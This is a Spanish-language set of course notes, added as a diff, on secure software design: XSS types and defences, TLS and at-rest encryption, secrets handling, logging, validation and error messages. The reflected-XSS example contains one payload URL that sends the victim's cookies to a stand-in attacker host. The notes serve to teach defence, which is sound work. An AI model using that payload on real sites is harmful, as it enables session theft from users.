@@ -1,0 +1,215 @@
+SEGURIDAD EN EL DISEÑO DE SOFTWARE
+Apuntes del profesor — Parte 3: XSS, Cifrado y Controles de Seguridad
+=======================================================================
+
+
+1. CROSS-SITE SCRIPTING (XSS)
+------------------------------
+
+1.1 Qué es
+~~~~~~~~~~
+El Cross-Site Scripting (XSS) es un tipo de vulnerabilidad de inyección en la que
+un atacante consigue que el navegador de otro usuario ejecute código JavaScript
+malicioso. A diferencia de la inyección SQL, el objetivo no es la base de datos
+sino el navegador de la víctima.
+
+XSS aparece en OWASP Top 10 A03 (Injection) en la edición 2021.
+
+1.2 Tipos de XSS
+~~~~~~~~~~~~~~~~
+Tipo 1 — XSS Reflejado (Reflected XSS)
+  El script malicioso viene incluido en la petición HTTP (generalmente en la URL)
+  y el servidor lo refleja en la respuesta sin sanitizar.
+
+  Ejemplo:
+    URL: https://ejemplo.com/buscar?q=<script>document.location='http://atacante.com/robar?c='+document.cookie</script>
+    Si el servidor muestra "Resultados para: [q]" sin escapar, ejecuta el script.
+
+  Vector de ataque habitual: enlaces maliciosos enviados por email o mensajería.
+
+Tipo 2 — XSS Almacenado (Stored XSS / Persistent XSS)
+  El script malicioso se guarda en la base de datos y se sirve a todos los usuarios
+  que visitan la página afectada. Es el más peligroso porque no requiere que la
+  víctima haga clic en un enlace especial.
+
+  Ejemplo: un atacante publica un comentario con contenido JavaScript malicioso.
+  Cada usuario que cargue la página de comentarios ejecutará el script.
+
+Tipo 3 — XSS basado en DOM (DOM-based XSS)
+  La vulnerabilidad está en el código JavaScript del lado cliente. El script malicioso
+  modifica el DOM directamente sin pasar por el servidor.
+
+  Ejemplo: código que lee document.location.hash y lo escribe en el DOM con innerHTML.
+
+1.3 Impacto
+~~~~~~~~~~~
+- Robo de cookies de sesión → suplantación de identidad del usuario
+- Keylogging: capturar todo lo que el usuario escribe en el navegador
+- Redireccionamiento a sitios de phishing
+- Modificación del contenido de la página (defacement)
+- Distribución de malware desde un dominio de confianza
+- Acceso a la cámara/micrófono si el sitio tiene esos permisos
+
+1.4 Contramedidas de diseño
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Medida 1 — Output Encoding (escapado de salida) — PRINCIPAL
+  Escapar todos los datos antes de incluirlos en la respuesta HTML, según el contexto:
+  - Contexto HTML:    &  →  &amp;   <  →  &lt;   >  →  &gt;   "  →  &quot;
+  - Contexto JS:      usar \uXXXX encoding o librerías específicas
+  - Contexto URL:     percent-encoding
+  La mayoría de frameworks modernos (React, Angular, Django, Thymeleaf) aplican
+  escapado automático. NUNCA usar innerHTML con datos del usuario.
+
+Medida 2 — Content Security Policy (CSP)
+  Cabecera HTTP que indica al navegador qué scripts están autorizados a ejecutarse.
+  Ejemplo:
+    Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.confiable.com
+  Bloquea la ejecución de scripts inline y de orígenes no autorizados, lo que mitiga
+  XSS incluso si el escapado de salida falla.
+
+Medida 3 — Validación de entradas
+  Rechazar entradas que contengan caracteres o patrones sospechosos.
+  Defensa secundaria; no sustituye al escapado de salida.
+
+Medida 4 — Atributo HttpOnly en cookies
+  Impide que las cookies de sesión sean accesibles desde JavaScript
+  (document.cookie devuelve vacío para cookies HttpOnly).
+  Esto no previene el XSS pero limita su impacto al impedir el robo de sesión.
+
+Medida 5 — Atributo SameSite en cookies
+  Restringe el envío de cookies en peticiones cross-site, reduciendo el riesgo
+  de ataques combinados (CSRF + XSS).
+
+Medida 6 — Usar frameworks con escapado automático
+  React, Angular, Vue, Thymeleaf, Django templates... escapan por defecto.
+  Evitar operaciones que desactivan este comportamiento:
+  - React: dangerouslySetInnerHTML
+  - Angular: bypassSecurityTrustHtml
+  - Django: {{ variable|safe }}
+
+
+2. CIFRADO EN TRÁNSITO Y EN REPOSO
+------------------------------------
+
+2.1 Cifrado en tránsito
+~~~~~~~~~~~~~~~~~~~~~~~
+Protege los datos mientras se transmiten entre dos puntos a través de la red.
+
+Protocolo estándar: TLS (Transport Layer Security), versiones 1.2 y 1.3.
+  - HTTPS = HTTP sobre TLS
+  - También aplica a: SMTP con STARTTLS, SFTP, conexiones a base de datos con SSL
+
+Qué protege:
+  - Interceptación de comunicaciones (man-in-the-middle)
+  - Escucha pasiva del tráfico (eavesdropping)
+  - Modificación de datos en tránsito (tampering)
+
+Buenas prácticas:
+  - Usar TLS 1.2 como mínimo; preferir TLS 1.3
+  - Configurar HSTS (HTTP Strict Transport Security) para forzar HTTPS
+  - Usar certificados válidos de CAs de confianza
+  - Deshabilitar versiones antiguas: SSLv2, SSLv3, TLS 1.0, TLS 1.1
+  - Usar cipher suites fuertes (ECDHE, AES-GCM, SHA-256 o superior)
+
+2.2 Cifrado en reposo
+~~~~~~~~~~~~~~~~~~~~~
+Protege los datos cuando están almacenados: bases de datos, discos, backups,
+archivos de configuración, logs.
+
+Algoritmos estándar:
+  - Cifrado simétrico: AES-256 (estándar de facto para datos en reposo)
+  - Cifrado asimétrico: RSA-2048 o superior, ECDSA (para claves y firmas)
+
+Niveles de aplicación:
+  - Cifrado de disco completo (BitLocker, LUKS): protege si el disco físico es robado
+  - Cifrado de base de datos (Transparent Data Encryption - TDE)
+  - Cifrado a nivel de campo: cifrar columnas específicas con datos sensibles (PAN, SSN)
+  - Cifrado de backups: los backups deben cifrarse igual que los datos en producción
+
+Gestión de claves:
+  - Las claves de cifrado no deben almacenarse junto a los datos cifrados
+  - Usar KMS (Key Management Service): AWS KMS, Azure Key Vault, HashiCorp Vault
+  - Rotar las claves periódicamente
+
+2.3 Por qué ambos son necesarios
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Son complementarios porque protegen contra amenazas distintas:
+
+  Amenaza                          | Cifrado en tránsito | Cifrado en reposo
+  ----------------------------------|---------------------|-----------------
+  Interceptación en red (MITM)     | Protege             | No protege
+  Acceso físico al disco/servidor  | No protege          | Protege
+  Volcado de base de datos         | No protege          | Protege
+  Backup robado                    | No protege          | Protege
+  Sniffing de red                  | Protege             | No protege
+
+Un sistema que solo cifra en tránsito expone los datos si alguien consigue acceso
+a la base de datos o a un backup. Uno que solo cifra en reposo expone los datos
+si se intercepta la comunicación.
+
+
+3. OTROS CONTROLES DE SEGURIDAD RELEVANTES
+--------------------------------------------
+
+3.1 Gestión segura de secretos
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Los secretos (contraseñas, claves API, tokens, certificados) nunca deben:
+- Estar hardcodeados en el código fuente
+- Subirse al repositorio de control de versiones (git)
+- Estar en ficheros de configuración sin cifrar en producción
+
+Alternativas correctas:
+- Variables de entorno gestionadas de forma segura
+- Sistemas de gestión de secretos: HashiCorp Vault, AWS Secrets Manager, Azure Key Vault
+- Ficheros .env excluidos del repositorio (en .gitignore)
+
+3.2 Logging y monitorización de seguridad
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Los logs de seguridad deben registrar:
+- Intentos de autenticación (éxito y fallo)
+- Accesos a recursos sensibles
+- Cambios de configuración o permisos
+- Errores de autorización (acceso denegado)
+- Operaciones sobre datos críticos (creación, modificación, borrado)
+
+Los logs NO deben contener:
+- Contraseñas, tokens o claves en texto plano
+- Datos personales sensibles (PAN de tarjeta, DNI completo, etc.)
+- Stack traces completos en logs accesibles al usuario
+
+Buenas prácticas:
+- Centralizar logs en un sistema separado (SIEM)
+- Establecer alertas para patrones anómalos (múltiples fallos de login, accesos fuera
+  de horario, volúmenes de datos inusuales)
+- Garantizar integridad de los logs (no deben poder modificarse por el atacante)
+- Definir política de retención (cuánto tiempo se guardan)
+
+3.3 Validación de entradas
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Toda entrada del usuario debe validarse antes de procesarse:
+- Validación de tipo: ¿es un número donde se espera un número?
+- Validación de longitud: ¿está dentro del rango esperado?
+- Validación de formato: ¿cumple el patrón esperado (email, fecha, etc.)?
+- Validación de rango: ¿el valor está dentro de los límites permitidos?
+- Lista blanca vs. lista negra: preferir lista blanca (definir qué está permitido)
+  sobre lista negra (intentar bloquear lo que está prohibido)
+
+Importante: la validación en el cliente (JavaScript) es solo para UX.
+La validación de seguridad SIEMPRE debe hacerse en el servidor.
+
+3.4 Gestión de errores segura
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Los mensajes de error expuestos al usuario no deben revelar:
+- Stack traces o detalles de implementación interna
+- Nombres de tablas, columnas o estructura de la base de datos
+- Versiones de frameworks o librerías
+- Rutas del sistema de ficheros del servidor
+- Información sobre si un usuario existe o no (en formularios de login/registro)
+
+Ejemplo incorrecto:
+  "Error: column 'password_hash' of relation 'users' does not exist"
+  (revela estructura de la base de datos)
+
+Ejemplo correcto:
+  "Ha ocurrido un error. Por favor, inténtelo de nuevo más tarde."
+  (el detalle queda registrado en los logs internos con un ID de traza)
